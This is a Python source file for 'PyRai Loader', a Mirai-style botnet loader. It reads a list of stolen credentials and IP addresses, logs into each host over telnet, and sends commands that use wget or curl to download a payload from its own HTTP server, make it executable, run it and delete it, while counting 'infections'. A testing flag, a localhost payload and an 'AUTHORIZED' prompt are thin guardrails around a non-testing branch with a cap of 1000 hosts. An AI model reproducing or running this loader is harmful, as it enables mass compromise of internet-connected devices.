#!/usr/bin/env python3
"""
PyRai Loader Module - Updated for Secure Testing
ETHICAL DISCLAIMER: This tool is for authorized testing only. Misuse is prohibited.
"""

import telnetlib
import sys
import os
import http.server
import socketserver
import logging
import time
from threading import Thread
from datetime import datetime

# modules
from libs import truecolors

# Configuration
__TESTING_MODE__ = True
__bin__ = "http://127.0.0.1:31338/test_payload.py"  # Updated for testing
__webp_ = "31338"
__MAX_INFECTIONS__ = 10 if __TESTING_MODE__ else 1000  # Limit for testing

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('loader.log'),
        logging.StreamHandler()
    ]
)

infection_count = 0

def create_test_payload():
    """Create a harmless test payload for testing"""
    bin_dir = os.path.join(os.path.dirname(__file__), 'bin')
    if not os.path.exists(bin_dir):
        os.makedirs(bin_dir)
    
    payload_path = os.path.join(bin_dir, 'test_payload.py')
    
    payload_content = '''#!/usr/bin/env python3
"""
PyRai Test Payload - Harmless Testing Version
ETHICAL DISCLAIMER: This is a test payload for authorized testing only.
"""

import os
import time
import sys
from datetime import datetime

def main():
    print("="*50)
    print("PyRai Test Payload Executed")
    print(f"Timestamp: {datetime.now()}")
    print(f"System: {os.name}")
    print(f"PID: {os.getpid()}")
    print("="*50)
    
    # Create a test file to prove execution
    test_file = "/tmp/pyrai_test.txt" if os.name != 'nt' else "C:\\\\temp\\\\pyrai_test.txt"
    try:
        with open(test_file, 'w') as f:
            f.write(f"PyRai test execution at {datetime.now()}\\n")
        print(f"Test file created: {test_file}")
    except:
        print("Could not create test file")
    
    # Self-destruct (remove this file)
    try:
        time.sleep(2)
        os.remove(__file__)
        print("Payload self-destructed")
    except:
        print("Could not self-destruct")
    
    print("Test payload completed successfully")

if __name__ == "__main__":
    main()
'''
    
    with open(payload_path, 'w') as f:
        f.write(payload_content)
    
    # Make executable on Unix systems
    if os.name != 'nt':
        os.chmod(payload_path, 0o755)
    
    truecolors.print_succ(f"Test payload created: {payload_path}")

def ServeHTTP():
    """Start HTTP server to serve payloads"""
    try:
        web_dir = os.path.join(os.path.dirname(__file__), 'bin')
        
        # Create bin directory and test payload if they don't exist
        if not os.path.exists(web_dir):
            os.makedirs(web_dir)
        
        create_test_payload()
        
        os.chdir(web_dir)
        Handler = http.server.SimpleHTTPRequestHandler
        
        # Custom handler to log requests
        class LoggingHandler(Handler):
            def log_message(self, format, *args):
                truecolors.print_info(f"HTTP: {format % args}")
        
        httpd = socketserver.TCPServer(("127.0.0.1" if __TESTING_MODE__ else "", int(__webp_)), LoggingHandler)
        truecolors.print_info(f"Webserver started on port {__webp_}")
        truecolors.print_info(f"Serving from: {web_dir}")
        
        # Run server in background
        server_thread = Thread(target=httpd.serve_forever, daemon=True)
        server_thread.start()
        
        return httpd
        
    except Exception as e:
        truecolors.print_errn(f"Failed to start webserver: {str(e)}")
        return None

def doConsumeLogin(ip, port, user, pass_):
    """Enhanced login and payload deployment with safety checks"""
    global infection_count
    
    # Check infection limit
    if infection_count >= __MAX_INFECTIONS__:
        truecolors.print_warn(f"Reached infection limit of {__MAX_INFECTIONS__}")
        return False
    
    tn = None
    need_user = False
    max_attempts = 3
    attempt_count = 0
    
    try:
        while attempt_count < max_attempts:
            try:
                if not tn:
                    asked_password_in_cnx = False
                    tn = telnetlib.Telnet(ip, port, timeout=10)
                    truecolors.print_info(f"[loader] Connection established to {ip}:{port}")
                
                login_successful = False
                
                while True:
                    response = tn.read_until(b":", 2)
                    response_str = str(response)
                    
                    if "Login:" in response_str or "Username:" in response_str:
                        truecolors.print_info("[loader] Received username prompt")
                        need_user = True
                        asked_password_in_cnx = False 
                        tn.write((user + "\n").encode('ascii'))
                        
                    elif "Password:" in response_str:
                        if asked_password_in_cnx and need_user:
                            tn.close()
                            break 
                            
                        asked_password_in_cnx = True 
                        
                        if not need_user:
                            pass  # Use provided credentials
                            
                        if not pass_:
                            truecolors.print_errn("[loader] No password provided")
                            return False
                            
                        truecolors.print_info("[loader] Received password prompt")
                        tn.write((pass_ + "\n").encode('ascii'))
                        
                    if any(prompt in response_str for prompt in [">", "$", "#", "%"]):
                        login_successful = True
                        truecolors.print_succ(f"[loader] Login succeeded {ip}:{port} with {user}:{pass_}")
                        break
                
                if login_successful:
                    # Deploy payload with enhanced safety
                    payload_name = os.path.basename(__bin__)
                    
                    if __TESTING_MODE__:
                        # Safe testing commands
                        commands = [
                            f"cd /tmp || cd /var/tmp || cd .",
                            f"wget {__bin__} -O {payload_name} || curl -o {payload_name} {__bin__}",
                            f"chmod +x {payload_name}",
                            f"python3 {payload_name} || python {payload_name}",
                            f"rm -f {payload_name}"
                        ]
                    else:
                        # Original commands for lab environment
                        commands = [
                            f"cd /tmp; cd /var/run; cd /mnt; cd /root",
                            f"wget {__bin__}",
                            f"chmod +x {payload_name}",
                            f"./{payload_name}",
                            f"rm -rf {payload_name}"
                        ]
                    
                    for cmd in commands:
                        truecolors.print_info(f"[loader] Executing: {cmd}")
                        tn.write((cmd + "\n").encode('ascii'))
                        time.sleep(1)  # Give time for command execution
                    
                    infection_count += 1
                    truecolors.print_succ(f"[loader] Infection completed on {ip}:{port}")
                    logging.info(f"Successful infection: {ip}:{port} with {user}:{pass_}")
                    
                    return True
                
                attempt_count += 1
                
            except EOFError as e:
                tn = None
                need_user = False
                truecolors.print_warn(f"[loader] Remote host dropped connection: {str(e)}")
                attempt_count += 1
                time.sleep(2)
                
    except Exception as e:
        truecolors.print_errn(f"[loader] Error during infection of {ip}:{port}: {str(e)}")
        logging.error(f"Infection error {ip}:{port}: {str(e)}")
        
    finally:
        if tn:
            try:
                tn.close()
            except:
                pass
    
    return False

def ForceDB(fname):
    """Process credential database with enhanced error handling"""
    try:
        if not os.path.isfile(fname):
            truecolors.print_errn(f"Loader: File '{fname}' doesn't exist, check the path.")
            return
        
        truecolors.print_info(f"Processing credential database: {fname}")
        
        processed = 0
        successful = 0
        
        with open(fname, 'r') as f:
            for line_num, line in enumerate(f, 1):
                line = line.strip()
                
                # Skip comments and empty lines
                if not line or line.startswith('#'):
                    continue
                
                try:
                    parts = line.split(':')
                    if len(parts) < 4:
                        truecolors.print_warn(f"Invalid line format at line {line_num}: {line}")
                        continue
                    
                    usr = parts[0].strip()
                    psw = parts[1].strip()
                    ip = parts[2].strip()
                    port = int(parts[3].strip())
                    
                    truecolors.print_info(f"Attempting infection: {ip}:{port} with {usr}:{psw}")
                    
                    if doConsumeLogin(ip, port, usr, psw):
                        successful += 1
                    
                    processed += 1
                    
                    # Rate limiting
                    time.sleep(1)
                    
                    # Check limits
                    if infection_count >= __MAX_INFECTIONS__:
                        truecolors.print_warn("Reached maximum infection limit")
                        break
                        
                except ValueError as e:
                    truecolors.print_errn(f"Invalid port number at line {line_num}: {line}")
                except Exception as e:
                    truecolors.print_errn(f"Error processing line {line_num}: {str(e)}")
        
        truecolors.print_succ(f"Processing complete: {processed} processed, {successful} successful")
        
    except KeyboardInterrupt:
        truecolors.print_errn("Operation interrupted by user.")
    except Exception as e:
        truecolors.print_errn(f"Loader error: {str(e)}")
        logging.error(f"Loader error: {str(e)}")

def print_banner():
    """Print startup banner"""
    print("="*60)
    print("PyRai Loader - Updated for Secure Testing")
    print("ETHICAL DISCLAIMER: This tool is for authorized testing only.")
    print("="*60)

def main():
    """Main loader function"""
    print_banner()
    
    if __TESTING_MODE__:
        truecolors.print_warn("TESTING MODE ENABLED")
        truecolors.print_warn(f"Max infections limited to: {__MAX_INFECTIONS__}")
    
    if len(sys.argv) < 2:
        truecolors.print_errn("Usage: python loader.py <credential_database>")
        truecolors.print_info("Example: python loader.py dump/csdb.txt")
        sys.exit(1)
    
    # Safety confirmation
    print("\n[SAFETY CONFIRMATION]")
    print("This loader will attempt to deploy payloads to compromised systems.")
    print("Ensure you have proper authorization for all target systems.")
    confirm = input("Type 'AUTHORIZED' to continue: ")
    
    if confirm != 'AUTHORIZED':
        truecolors.print_errn("Safety confirmation failed. Exiting.")
        sys.exit(1)
    
    # Start HTTP server
    httpd = ServeHTTP()
    if not httpd:
        truecolors.print_errn("Failed to start HTTP server. Exiting.")
        sys.exit(1)
    
    try:
        # Process credential database
        db_file = sys.argv[1]
        ForceDB(db_file)
        
    except KeyboardInterrupt:
        truecolors.print_info("Shutdown signal received...")
    finally:
        if httpd:
            truecolors.print_info("Shutting down HTTP server...")
            httpd.shutdown()
            httpd.server_close()
        
        truecolors.print_succ("Loader shutdown complete.")

if __name__ == "__main__":
    main()